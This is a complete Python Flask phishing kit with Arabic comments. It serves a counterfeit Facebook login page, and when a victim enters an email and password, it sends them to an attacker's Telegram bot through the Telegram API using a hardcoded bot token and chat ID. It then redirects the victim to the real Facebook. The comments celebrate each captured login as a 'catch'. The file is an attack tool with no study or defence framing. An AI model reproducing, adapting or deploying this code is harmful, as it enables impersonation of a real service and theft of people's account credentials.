import os
import requests
from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# --- معلوماتك الصحيحة ---
TOKEN = "8599495749:AAFIQkYkNLJV_Xn_ZckTIxFoTp8Fm4ChlG0" #
CHAT_ID = "7479786207" #

html_code = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { background: #f0f2f5; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 40px; }
        .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 20px; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 340px; }
        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 20px; font-size: 12px; color: #737373; }
    </style>
</head>
<body>
    <div class="logo">facebook</div>
    <div class="box">
        <form action="/login" method="POST">
            <input type="text" name="u" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="p" placeholder="كلمة السر" required>
            <button class="btn">تسجيل الدخول</button>
        </form>
    </div>
    <div class="footer">المطور فارس والحاج © 2026</div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_code)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('u')
    password = request.form.get('p')
    
    # تصحيح رابط الإرسال (Telegram API)
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"🎯 صيد جديد يا فارس!\\n📧 الحساب: {user}\\n🔑 الباسورد: {password}"
    }
    
    try:
        requests.post(url, data=payload) # استعملنا POST لضمان وصول البيانات
    except Exception as e:
        print(f"Error: {e}")

    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
